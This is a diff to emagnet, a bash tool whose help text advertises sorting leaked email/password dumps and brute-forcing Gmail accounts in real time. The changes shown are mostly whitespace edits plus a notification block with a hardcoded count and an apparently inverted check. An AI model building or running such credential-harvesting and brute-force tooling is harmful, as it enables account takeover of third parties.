@@ -394,13 +394,13 @@ clear
 banner
 printf "  ./emagnet -e [emagnet] [bruteforce <service>] [syntax]\n"
 cat << "EOF"
-    
+
         - emagnet for just sort email and password files into directories
-  
+
         - bruteforce for brute-force attack gmail accounts in realtime
-  
+
         - syntax for download files sorted by syntaxes (syntaxes set by pastebin)
- 
+
  ./emagnet -i   - Print your current WAN IP-Address
 
  ./emagnet -k   - Kill emagnet sessions
@@ -667,10 +667,20 @@ elif [[ $pt -gt "0" ]] && [[ $it -gt "0" ]]; then
    cp -rn $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
 
 ###########################################################################################
-#### This has been added and commented for a reason, this iwll be added for a feature..####
-#### we gonna add in upcomming versions, not neccessary means in next version..........####
+#### Notify user how many emails and passwords we have found...........................####
 ###########################################################################################
-#if [[ $(env |grep DESKTOP|cut -d= -f2) = "KDE" ]]; then wegonnadosometihnghere;fi
+notify-send &> /dev/null
+if [[ $? -eq "1" ]]; then
+if [[ $NOTIFY = "true" ]]; then
+WM="$(env |grep DESKTOP|cut -d= -f2)"
+if [[ $WM = "KDE" ]]; then
+  notify-send "EMAGNET"  "Found 12 emails and 12 passwords"
+fi
+fi
+else
+echo "You must install notify-send before you can get notifications..."
+exit 1
+fi
 
 ##########################################################################################
 #  | If we are not banned and we get 0 emails then we have 0                 |         | #
@@ -851,7 +861,7 @@ safety;checkeverything
 ################################################################################
 
 while getopts ":e:cdfimkmhsqv" getopt; do
-  case $getopt in
+    case $getopt in
        i|\--ip) clear;banner;printf "%24s$(curl -s https://nr1.nu/i/)\n\n"                  ;;
        m|\--stats) mergeem                                                                  ;;
        e|\--emagnet)
